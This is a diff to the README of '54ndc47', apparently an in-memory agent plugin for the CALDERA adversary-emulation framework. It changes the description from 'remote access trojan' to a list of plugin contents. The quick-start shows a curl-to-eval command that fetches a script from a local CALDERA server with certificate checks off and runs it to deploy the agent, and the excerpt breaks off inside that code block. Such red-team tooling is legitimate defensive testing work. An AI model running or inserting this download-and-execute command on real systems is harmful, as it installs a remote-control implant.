@@ -1,14 +1,13 @@
 # 54ndc47
 
-54ndc47 is an in-memory agent - or remote access trojan (RAT) - which connects to
-CALDERA via HTTP. Once connected, it registers itself as an agent and periodically
-asks for instructions on what to do next. Instructions are in the form of an encoded
-shell command. 
+This plugin contains:
+* A custom in-memory agent, with variants for PowerShell and Bash
+* API endpoints for the agent to communicate to CALDERA over HTTPS
 
 ## Quick start
 
 Start the agent on a Linux or OSX box with either of the bash commands below. Note, the second 
-command attaches a group (for example, named 'client') to the agent when it first registers.
+command attaches a group to the agent when it first registers.
 
 ```
 eval "$(curl -sk -X POST -H "file:54ndc47.sh" https://localhost:8888/file/render)"
